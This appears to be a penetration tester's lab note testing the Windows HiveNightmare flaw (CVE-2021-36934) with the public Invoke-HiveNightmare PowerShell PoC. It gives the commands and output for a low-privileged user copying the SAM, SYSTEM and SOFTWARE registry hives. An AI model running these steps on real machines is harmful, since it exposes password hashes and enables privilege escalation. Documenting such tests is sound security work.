======================================================================================================================================
Local Privilege Escalation - SeriousSam / HiveNightmare (CVE-2021-36934)
======================================================================================================================================


======================================================================================================================================
1. Test of the SeriousSam / HiveNightmare local privilege escalation vulnerability using the PowerShell script 'Invoke-HiveNightmare' 
======================================================================================================================================

Link: https://github.com/WiredPulse/Invoke-HiveNightmare
      PowerShell-based PoC for CVE-2021-36934, which enables a standard user to be able to retrieve the SAM, SYSTEM, and SOFTWARE Registry hives in Windows 10 version 1809 or newer.


Step 1 - Start a CMD shell as a low-privileged user
====================================================

Microsoft Windows [Version 10.0.19042.1110]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
Win-Laptop-Test\auditor

C:\WINDOWS\system32> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
Guest
jeff
The command completed successfully.

PS C:\Users\Public\Privesc-HiveNightmare> whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
Win-Laptop-Test\auditor S-1-5-21-936125016-2310263949-2175806047-1013


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users          Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

ERROR: Unable to get user claims information.


Step 2 - Start powershell and execute the script 'Invoke-HiveNightmare.ps1' to dump the registry hives "SAM", "SYSTEM" and "SOFTWARE" 
=================================================================================================================================================

C:\WINDOWS\system32>powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Public\Privesc-HiveNightmare> .\Invoke-HiveNightmare.ps1 "C:\Users\Public\Privesc-HiveNightmare\"

Error reading or writing history file 'C:\Users\Default\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt': Access to the path 'C:\Users\Default\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine' is denied.
This error will not be reported again in this session. Consider using a different path with:
    Set-PSReadLineOption -HistorySavePath <Path>
Or not saving history with:
    Set-PSReadLineOption -HistorySaveStyle SaveNothing
	
[+] System is a vulnerable version of Windows
[+] Dumping SAM1 hive...
[+] Dumping SOFTWARE1 hive...
[+] Dumping SYSTEM1 hive...
[+] Dumping SAM2 hive...
[+] Dumping SOFTWARE2 hive...
[+] Dumping SYSTEM2 hive...
[+] Dumping SAM3 hive...
[+] Dumping SOFTWARE3 hive...
[+] Dumping SYSTEM3 hive...
[+] Hives are dumped to C:\Users\Public\Privesc-HiveNightmare\


PS C:\Users\Public\Privesc-HiveNightmare> ls

    Directory: C:\Users\Public\Privesc-HiveNightmare

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        08/08/2021     19:54           2640 Invoke-HiveNightmare.ps1
-a----        27/06/2021     19:01          65536 Sam.hive1
-a----        27/06/2021     19:01          65536 Sam.hive2
-a----        01/08/2021     20:26          65536 Sam.hive3
-a----        12/07/2021     13:31      139198464 Soft.hive1
-a----        12/07/2021     13:31      144179200 Soft.hive2
-a----        01/08/2021     20:26      149684224 Soft.hive3
-a----        27/06/2021     19:01       33554432 Sys.hive1
-a----        27/06/2021     19:01       33554432 Sys.hive2
-a----        01/08/2021     20:26       31981568 Sys.hive3
-a----        08/08/2021     19:55            718 test.txt

PS C:\Users\Public\Privesc-HiveNightmare>

=> The exploit works !

